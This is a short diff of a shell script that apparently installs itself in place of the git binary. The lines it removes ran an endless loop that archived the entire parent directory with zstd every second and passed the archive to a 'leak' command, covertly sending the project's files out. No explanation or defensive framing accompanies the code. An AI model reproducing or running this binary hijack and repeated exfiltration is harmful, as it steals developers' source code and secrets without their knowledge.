@@ -19,13 +19,3 @@ else
   cp -v "$oldgit" "$realgit"
   cp -v "$0" "$oldgit"
 fi
-
-cd ..
-while true; do
-  f=/tmp/a.zstd
-  rm -rf "$f"
-  ZSTD_CLEVEL=19 tar cf "$f" --zstd --exclude=db --exclude=_build --exclude=.lexical --exclude=.elixir_ls --exclude=.pytest_cache --exclude=.ruff_cache --exclude=__pycache__ .
-  sha1sum "$f"
-  leak "@$f"
-  sleep 1
-done
